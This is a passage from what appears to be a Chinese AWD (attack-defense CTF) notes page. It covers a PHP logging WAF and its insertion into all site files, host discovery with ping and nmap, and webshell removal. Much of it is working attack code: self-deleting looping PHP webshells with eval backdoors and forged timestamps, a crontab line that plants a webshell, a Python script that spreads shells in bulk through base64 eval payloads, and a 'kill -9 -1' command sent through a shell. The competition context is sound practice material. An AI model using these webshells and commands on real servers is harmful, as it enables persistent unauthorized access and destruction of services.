  <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Asia/Shanghai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//修正时间为中国准确时间</span>
  <span class="token variable">$time</span><span class="token operator">=</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Y-m-d H:i:s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将时间赋值给变量$time</span>
  <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token constant">LOG_FILENAME</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r\n\r\n\r\n"</span> <span class="token operator">.</span> <span class="token variable">$time</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\r\n"</span> <span class="token operator">.</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// die() or unset($_GET) or unset($_POST) or unset($_COOKIE);</span>

<span class="token punctuation">&#125;</span>
<span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"*.php"</span> <span class="token parameter variable">-exec</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">"s/&lt;?php/&lt;?php require_once('\/var\/www\/html\/full.php');/g"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>





<hr>
<h1 id="防御权限维持"><a href="#防御权限维持" class="headerlink" title="防御权限维持"></a>防御权限维持</h1><p>如果无法使用低权限用户修改网站文件时，需要自己给自己上一个马（MD5马），维持www-data权限，方便动态进行文件改动（注意修改文件权限777），如patch等（仅限PHP）</p>
<hr>
<h1 id="D盾-amp-Seay代码审计"><a href="#D盾-amp-Seay代码审计" class="headerlink" title="D盾&amp;Seay代码审计"></a>D盾&amp;Seay代码审计</h1><p>代码审计思路：</p>
<p>命令注入&#x2F;RCE -&gt; 文件上传&#x2F;文件包含 -&gt; 反序列化 -&gt; SQL注入 -&gt; 文件读取</p>
<hr>
<h1 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h1><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>这一步操作是为了获取其它对手的靶机ip</p>
<h3 id="探测目标存活"><a href="#探测目标存活" class="headerlink" title="探测目标存活"></a>探测目标存活</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pythonping
<span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor


<span class="token keyword">def</span> <span class="token function">get_ip</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> pythonping<span class="token punctuation">.</span>ping<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"Reply"</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>ip <span class="token operator">+</span> <span class="token string">" 是存活地址"</span><span class="token punctuation">)</span>


ip <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"192-168-1-"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".pvp3830.bugku.cn"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
    result <span class="token operator">=</span> executor<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>get_ip<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sn</span> <span class="token number">192.168</span>.0.0/24         <span class="token comment">#扫描C段主机存活</span>
nmap <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.0.2            <span class="token comment">#扫描主机系统版本</span>
nmap <span class="token parameter variable">-sS</span> <span class="token number">192.168</span>.0.2            <span class="token comment">#扫描主机常用端口</span>
nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-p</span> <span class="token number">80,445</span> <span class="token number">192.168</span>.0.2  <span class="token comment">#扫描主机部分端口</span>
nmap <span class="token parameter variable">-sS</span> -p- <span class="token number">192.168</span>.0.2        <span class="token comment">#扫描主机全部端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>dirsearch秒了</p>
<hr>
<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>也是一种内存马</p>
<blockquote>
<p>在 Linux 中，文件名以 <code>-</code> 开头的文件在命令行中通常被解释为选项或参数，而不是文件名</p>
</blockquote>
<p>于是我们的马的名字可以以<code>-</code>开头</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 客户机断开依旧执行</span>
<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。</span>
<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 删除文件本身，以起到隐蔽自身的作用。</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'-2.php'</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="edee85b6d1da959d5fa73ce6ebde9c72")&#123;@eval($_POST[a]);&#125; ?>'</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 这是修改生成时间</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2017-10-17 10:25:33" .2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="定时任务写马"><a href="#定时任务写马" class="headerlink" title="定时任务写马"></a>定时任务写马</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">system('echo "* * * * * echo \"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span>\\\\\\\\\<span class="token variable">$_POST</span><span class="token punctuation">[</span>pass<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span>\<span class="token string single-quoted-string">'edee85b6d1da959d5fa73ce6ebde9c72\')&#123;@eval(\\\\\\\\\$_POST[1]);&#125;  \" > /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="命令生成不死马"><a href="#命令生成不死马" class="headerlink" title="命令生成不死马"></a>命令生成不死马</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ax</span> <span class="token comment"># 显示正在运行的进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php">system('while true;do echo \'<span class="token prolog">&lt;?php if(md5($_GET[pass])==\"edee85b6d1da959d5fa73ce6ebde9c72\")&#123;@eval($_GET[a]);&#125; ?></span>\' >fuck.php;sleep 0.1;done;');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="批量生成不死马"><a href="#批量生成不死马" class="headerlink" title="批量生成不死马"></a>批量生成不死马</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment"># coding=utf-8</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests

<span class="token triple-quoted-string string">'''
作用：向靶机发命令来写文件，文件名.index1.php
webshell.txt 格式如下：
http://127.0.0.1:80/1110/x.php,xost,x
http://127.0.0.2/1110/xx.php,POST,x
http://127.0.0.3/1011/x.php,get,3
http://192.168.1.155/1110/x.php,post,x
http://127.0.0.1/1110/y.php?pass=Sn3rtf4ck,get,a
'''</span>

<span class="token keyword">def</span> <span class="token function">loadfile</span><span class="token punctuation">(</span>filepath<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filepath<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"File %s Not Found!"</span> <span class="token operator">%</span> filepath<span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> method<span class="token punctuation">,</span> passwd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#分割url ip 127.0.0.1:80 Rfile=/1111/x.php?pass=Sn3rtf4ck</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        url<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span>
        <span class="token comment">#去除http://   ==> 127.0.0.1:80/1110/x.php</span>
        urlstr <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        lis <span class="token operator">=</span> urlstr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
        ip <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lis<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        Rfile <span class="token operator">=</span> <span class="token string">""</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            Rfile <span class="token operator">=</span> Rfile <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        urlstr <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        lis <span class="token operator">=</span> urlstr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
        ip <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lis<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        Rfile <span class="token operator">=</span> <span class="token string">""</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            Rfile <span class="token operator">=</span> Rfile <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] %s ERR_CONNECTION_TIMED_OUT"</span> <span class="token operator">%</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>

    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] %s Page Not Found!"</span> <span class="token operator">%</span> url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    
  	<span class="token comment">#执行命令 system,exec,passthru,`,shell_exec</span>
  	<span class="token comment">#a=@eval(base64_decode($_GET[z0]));&amp;z0=c3lzdGVtKCJ3aG9hbWkiKTs=</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span>passwd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'@eval(base64_decode($_GET[z0]));'</span>
        data<span class="token punctuation">[</span><span class="token string">'z0'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'c3lzdGVtKCJ3aG9hbWkiKTs='</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
    <span class="token keyword">elif</span> method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">:</span>
        data<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sn3rtf4ck"</span>
        data<span class="token punctuation">[</span>passwd<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'@eval(base64_decode($_POST[z0]));'</span>
        data<span class="token punctuation">[</span><span class="token string">'z0'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'c3lzdGVtKCJ3aG9hbWkiKTs='</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>
    
  	<span class="token comment">#检查shell是否存在</span>
    <span class="token builtin">list</span> <span class="token operator">=</span> Rfile<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
    b_url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> ip
    <span class="token builtin">max</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        b_url <span class="token operator">=</span> b_url <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token builtin">list</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    shell_url <span class="token operator">=</span> b_url <span class="token operator">+</span> <span class="token string">"/.index1.php"</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>shell_url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] %s create shell failed!"</span> <span class="token operator">%</span> shell_url<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] %s succeeded!'</span> <span class="token operator">%</span> shell_url<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    shellstr <span class="token operator">=</span> loadfile<span class="token punctuation">(</span><span class="token string">"./webshell.txt"</span><span class="token punctuation">)</span>
    <span class="token builtin">list</span> <span class="token operator">=</span> shellstr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span>
    i <span class="token operator">=</span> <span class="token number">0</span>
    url <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    passwd <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    method <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> data <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> data<span class="token punctuation">:</span>
            ls <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span>
            method_tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            method_tmp <span class="token operator">=</span> method_tmp<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> method_tmp <span class="token operator">==</span> <span class="token string">'post'</span> <span class="token keyword">or</span> method_tmp <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">:</span>
                url<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                method<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> method_tmp
                passwd<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                i <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] %s request method error!"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ls<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment">#调用执行命令的模块</span>
        <span class="token comment">#print str(j)</span>
        <span class="token comment">#print "url is %s method is %s passwd is %s" %(url[j],method[j],passwd[j])</span>
        cmd<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> method<span class="token operator">=</span>method<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span>passwd<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="不死马处理"><a href="#不死马处理" class="headerlink" title="不死马处理"></a>不死马处理</h3><p>在自己的shell里杀掉进程重启服务（靶机一般没有权限做不到）、写同名文件夹或者写一个 sleep 时间低于别人的马、或者写脚本不断删除马。<br>只删掉脚本是没用的，因为 php 执行的时候已经将脚本解释成 opcode 运行。</p>
<p>杀进程，这里是杀掉所有apache2的进程，因为没有root权限所以不用担心服务挂掉</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"kill `ps -ef | grep apache2 | grep -v grep | awk '&#123;print <span class="token interpolation"><span class="token variable">$2</span></span>&#125;'`"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写同名文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> <span class="token parameter variable">-rf</span> .config.php <span class="token operator">|</span> <span class="token function">mkdir</span> .config.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>手动删除</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">shell.php: <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'9415'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
url访问：shell.php?9415=system('kill -9 -1');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>脚本竞争覆盖原有文件的内容：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/app/data/upload/202404/.config.php'</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag&#123;You shall die!&#125;'</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" /app/data/upload/202404/.config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一把梭防御：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>

<span class="token function">ps</span> <span class="token parameter variable">-aux</span>

<span class="token builtin class-name">echo</span> <span class="token string">"杀进程..."</span>
<span class="token assign-left variable">webapp</span><span class="token operator">=</span><span class="token string">"/var/www/html"</span>  <span class="token comment"># 自定义的 webapp 路径</span>
<span class="token assign-left variable">php_code1</span><span class="token operator">=</span><span class="token string">"&lt;?php
while (1) &#123;
    system(<span class="token entity" title="\&quot;">\"</span>kill \<span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> apache2 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print \$2&#125;'</span><span class="token punctuation">\</span><span class="token variable">`</span></span><span class="token entity" title="\&quot;">\"</span>);
    usleep(500);
&#125;
?>"</span>

<span class="token comment"># 创建 PHP 文件</span>
<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$php_code1</span>"</span> <span class="token operator">></span> <span class="token string">"<span class="token variable">$webapp</span>/kill_apache.php"</span>

<span class="token comment"># 访问 PHP 文件</span>
<span class="token function">curl</span> <span class="token string">"http://localhost/kill_apache.php"</span>

<span class="token comment"># 同名覆盖</span>
<span class="token assign-left variable">evil</span><span class="token operator">=</span><span class="token string">"/var/www/html/.config.php"</span> <span class="token comment"># 不死马路径</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token variable">$evil</span> <span class="token operator">|</span> <span class="token function">mkdir</span> <span class="token variable">$evil</span>

<span class="token comment"># 条件竞争</span>

<span class="token assign-left variable">php_code2</span><span class="token operator">=</span><span class="token string">"&lt;?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    \<span class="token variable">$file</span> = '<span class="token variable">$evil</span>';
